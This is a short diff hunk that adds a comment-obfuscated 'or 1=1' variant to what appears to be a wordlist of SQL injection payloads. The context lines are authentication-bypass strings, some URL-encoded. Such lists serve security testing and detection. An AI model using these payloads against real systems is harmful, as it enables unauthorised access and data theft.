@@ -10,3 +10,4 @@
 %0Aor'1'=1
 user' or 'a'='a
 user%27+or+%27a%27%3D%27a
+or /* comment */ 1=1
